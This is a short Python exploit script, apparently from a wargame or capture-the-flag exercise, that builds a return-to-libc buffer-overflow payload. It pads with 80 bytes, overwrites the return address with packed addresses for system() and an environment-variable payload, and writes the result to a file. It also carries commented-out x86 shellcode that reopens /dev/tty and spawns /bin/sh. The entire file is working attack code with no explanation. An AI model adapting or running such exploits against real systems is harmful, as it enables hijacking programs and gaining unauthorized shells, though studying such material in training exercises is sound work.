#!/usr/bin/python
import subprocess
import struct
import os

#sc = '\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'

payload = 'A' * 80
payload += struct.pack('<L', 0x8048383) # ret addr
payload += struct.pack('<L', 0xb7ecefb0) # system addr in stack
payload += struct.pack('<L', 0xb7ec50c0) # sc addr in stack
payload += struct.pack('<L', 0xbffff8a9) #  SPECIALPAYLOAD env addr
#payload += sc

with open('payload', 'w') as fd:
    fd.write(payload)

